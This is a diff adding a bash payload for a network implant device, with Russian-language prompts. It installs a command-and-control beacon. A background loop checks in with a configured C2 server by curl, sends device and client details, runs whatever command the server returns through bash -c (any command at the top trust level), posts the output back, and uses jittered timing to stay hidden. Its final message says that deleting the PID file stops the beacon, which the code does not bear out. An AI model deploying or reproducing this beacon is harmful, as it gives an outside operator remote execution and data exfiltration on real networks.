@@ -1,0 +1,247 @@
+#!/bin/bash
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+# Title: C2 Beacon
+# Author: NullSec
+# Description: Маяк командования и контроля с периодической проверкой и удаленным выполнением
+# Category: nullsec/remote
+
+# FIX: UI PATH and fallbacks
+export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
+command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
+command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
+command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
+command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
+command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
+command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Value: " val; echo "$val"; }
+command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
+command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }
+
+LOOT_DIR="/mmc/nullsec/c2beacon"
+mkdir -p "$LOOT_DIR"
+
+PROMPT "C2 БИКОН
+
+Устанавливает маяк командования и
+контроля, который периодически
+проверяется с удаленным сервером.
+
+Функции:
+- HTTP/HTTPS проверка
+- Получение и выполнение команд
+- Возврат результатов в C2
+- Настраиваемые интервалы
+- Скрытый временной джиттер
+- Поддержка выключателя
+
+Нажмите OK для настройки."
+
+# Check connectivity
+if ! ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1; then
+    ERROR_DIALOG "Нет интернет-соединения! Маяк C2 требует активного интернета."
+    exit 1
+fi
+
+if ! command -v curl >/dev/null 2>&1; then
+    ERROR_DIALOG "curl не найден! Установите: opkg update && opkg install curl"
+    exit 1
+fi
+
+C2_URL=$(TEXT_PICKER "C2 server URL:" "https://c2.example.com/beacon")
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) C2_URL="" ;; esac
+[ -z "$C2_URL" ] && { ERROR_DIALOG "Требуется URL C2!"; exit 1; }
+[ "$C2_URL" = "https://c2.example.com/beacon" ] && { ERROR_DIALOG "Настройте реальный URL C2!"; exit 1; }
+
+AUTH_TOKEN=$(TEXT_PICKER "Auth token:" "")
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) AUTH_TOKEN="" ;; esac
+
+PROMPT "ИНТЕРВАЛ ПРОВЕРКИ:
+
+1. Агрессивный (30с)
+2. Нормальный (5 мин)
+3. Низкий и медленный (15 мин)
+4. Спящий (1 час)
+5. Пользовательский интервал
+
+Выберите режим далее."
+
+INTERVAL_MODE=$(NUMBER_PICKER "Интервал (1-5):" 2)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTERVAL_MODE=2 ;; esac
+
+case $INTERVAL_MODE in
+    1) INTERVAL=30 ;;
+    2) INTERVAL=300 ;;
+    3) INTERVAL=900 ;;
+    4) INTERVAL=3600 ;;
+    5) INTERVAL=$(NUMBER_PICKER "Секунды:" 300)
+       case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTERVAL=300 ;; esac ;;
+    *) INTERVAL=300 ;;
+esac
+
+[ "$INTERVAL" -lt 10 ] && INTERVAL=10
+[ "$INTERVAL" -gt 86400 ] && INTERVAL=86400
+
+JITTER=$(NUMBER_PICKER "Jitter % (0-50):" 20)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) JITTER=20 ;; esac
+[ "$JITTER" -lt 0 ] && JITTER=0
+[ "$JITTER" -gt 50 ] && JITTER=50
+
+PROMPT "ЛИМИТЫ ВЫПОЛНЕНИЯ:
+
+1. Все команды (полные)
+2. Только сбор информации
+3. Только сетевые команды
+4. Пользовательский белый список
+
+Выберите уровень доверия далее."
+
+TRUST_LEVEL=$(NUMBER_PICKER "Доверие (1-4):" 2)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TRUST_LEVEL=2 ;; esac
+
+MAX_RUNTIME=$(NUMBER_PICKER "Макс время работы (часы):" 24)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_RUNTIME=24 ;; esac
+[ "$MAX_RUNTIME" -lt 1 ] && MAX_RUNTIME=1
+[ "$MAX_RUNTIME" -gt 720 ] && MAX_RUNTIME=720
+
+# Generate beacon ID
+BEACON_ID=$(cat /sys/class/net/eth0/address 2>/dev/null | md5sum | cut -c1-12)
+[ -z "$BEACON_ID" ] && BEACON_ID=$(head -c 6 /dev/urandom | xxd -p)
+
+resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ БИКОН?
+
+C2: ${C2_URL:0:30}...
+ID Бикона: $BEACON_ID
+Интервал: ${INTERVAL}с
+Джиттер: ${JITTER}%
+Доверие: Уровень $TRUST_LEVEL
+Макс время: ${MAX_RUNTIME}ч
+
+Нажмите OK для активации.")
+[ "$resp" != "0" ] && exit 0
+
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+BEACON_LOG="$LOOT_DIR/beacon_$TIMESTAMP.log"
+RESULT_DIR="$LOOT_DIR/results"
+PID_FILE="$LOOT_DIR/beacon.pid"
+mkdir -p "$RESULT_DIR"
+
+# Kill existing beacon
+if [ -f "$PID_FILE" ]; then
+    OLD_PID=$(cat "$PID_FILE")
+    kill "$OLD_PID" 2>/dev/null
+    rm -f "$PID_FILE"
+fi
+
+# Command validation based on trust level
+validate_command() {
+    local cmd="$1"
+    case $TRUST_LEVEL in
+        1) return 0 ;;
+        2) echo "$cmd" | grep -qiE '^(cat |ls |ip |ifconfig|arp|netstat|uname|uptime|whoami|id|df|free|ps|iw |iwinfo|hostapd)' && return 0 ;;
+        3) echo "$cmd" | grep -qiE '^(ip |ifconfig|arp|netstat|ping|traceroute|nmap|tcpdump|iw |iwinfo|iwlist)' && return 0 ;;
+        4) # Custom whitelist from file
+           WHITELIST_FILE="$LOOT_DIR/whitelist.txt"
+           [ -f "$WHITELIST_FILE" ] && grep -qF "$(echo "$cmd" | awk '{print $1}')" "$WHITELIST_FILE" && return 0 ;;
+    esac
+    return 1
+}
+
+LOG "Бикон C2 активирован: $BEACON_ID"
+SPINNER_START "Активация бикона..."
+
+# Launch beacon loop in background
+(
+    START_TIME=$(date +%s)
+    MAX_SECONDS=$((MAX_RUNTIME * 3600))
+    CHECKIN_COUNT=0
+
+    while true; do
+        ELAPSED=$(( $(date +%s) - START_TIME ))
+        [ "$ELAPSED" -ge "$MAX_SECONDS" ] && { echo "[$(date)] Max runtime reached" >> "$BEACON_LOG"; break; }
+
+        CHECKIN_COUNT=$((CHECKIN_COUNT + 1))
+        SYSINFO=$(uname -a 2>/dev/null)
+        UPTIME=$(uptime 2>/dev/null)
+        CLIENTS=$(cat /tmp/dhcp.leases 2>/dev/null | wc -l | tr -d ' ')
+
+        RESPONSE=$(curl -s -m 15 \
+            -H "X-Beacon-ID: $BEACON_ID" \
+            -H "X-Auth-Token: $AUTH_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"id\":\"$BEACON_ID\",\"checkin\":$CHECKIN_COUNT,\"uptime\":\"$UPTIME\",\"clients\":$CLIENTS,\"elapsed\":$ELAPSED}" \
+            "$C2_URL" 2>/dev/null)
+
+        echo "[$(date)] Check-in #$CHECKIN_COUNT response: ${RESPONSE:0:100}" >> "$BEACON_LOG"
+
+        # Parse command from response (expects JSON: {"cmd":"command","id":"task_id"})
+        CMD=$(echo "$RESPONSE" | grep -oP '"cmd"\s*:\s*"\K[^"]+' 2>/dev/null)
+        TASK_ID=$(echo "$RESPONSE" | grep -oP '"id"\s*:\s*"\K[^"]+' 2>/dev/null)
+
+        # Check for kill switch
+        if echo "$RESPONSE" | grep -q '"kill"'; then
+            echo "[$(date)] Kill switch received" >> "$BEACON_LOG"
+            break
+        fi
+
+        if [ -n "$CMD" ]; then
+            echo "[$(date)] Task $TASK_ID: $CMD" >> "$BEACON_LOG"
+
+            if validate_command "$CMD"; then
+                # Execute with timeout
+                RESULT=$(timeout 30 bash -c "$CMD" 2>&1)
+                RESULT_FILE="$RESULT_DIR/task_${TASK_ID}_$(date +%s).txt"
+                echo "$RESULT" > "$RESULT_FILE"
+
+                # Return results
+                curl -s -m 15 \
+                    -H "X-Beacon-ID: $BEACON_ID" \
+                    -H "X-Auth-Token: $AUTH_TOKEN" \
+                    -H "Content-Type: application/json" \
+                    -d "{\"id\":\"$TASK_ID\",\"result\":$(echo "$RESULT" | head -c 4096 | python3 -c 'import sys,json;print(json.dumps(sys.stdin.read()))' 2>/dev/null || echo '\"output too large\"')}" \
+                    "${C2_URL}/result" >/dev/null 2>&1
+
+                echo "[$(date)] Task $TASK_ID completed" >> "$BEACON_LOG"
+            else
+                echo "[$(date)] Task $TASK_ID BLOCKED by trust level" >> "$BEACON_LOG"
+            fi
+        fi
+
+        # Sleep with jitter
+        if [ "$JITTER" -gt 0 ]; then
+            JITTER_AMT=$(( INTERVAL * JITTER / 100 ))
+            ACTUAL_DELAY=$(( INTERVAL + (RANDOM % (JITTER_AMT * 2 + 1)) - JITTER_AMT ))
+            [ "$ACTUAL_DELAY" -lt 5 ] && ACTUAL_DELAY=5
+        else
+            ACTUAL_DELAY=$INTERVAL
+        fi
+        sleep "$ACTUAL_DELAY"
+    done
+
+    rm -f "$PID_FILE"
+) &
+BEACON_PID=$!
+echo "$BEACON_PID" > "$PID_FILE"
+
+sleep 3
+SPINNER_STOP
+
+if kill -0 "$BEACON_PID" 2>/dev/null; then
+    LOG "Бикон активен (PID: $BEACON_PID)"
+    PROMPT "БИКОН АКТИВЕН
+
+ID Бикона: $BEACON_ID
+PID: $BEACON_PID
+Интервал: ${INTERVAL}с ±${JITTER}%
+Доверие: Уровень $TRUST_LEVEL
+Макс время: ${MAX_RUNTIME}ч
+
+Лог: $BEACON_LOG
+
+Работает в фоне.
+Остановить можно удалением PID-файла или передав kill-команду с C2."
+else
+    ERROR_DIALOG "БИКОН НЕ УДАЛСЯ
+
+Проверьте URL C2 и сеть.
+Лог: $BEACON_LOG"
+    rm -f "$PID_FILE"
+fi
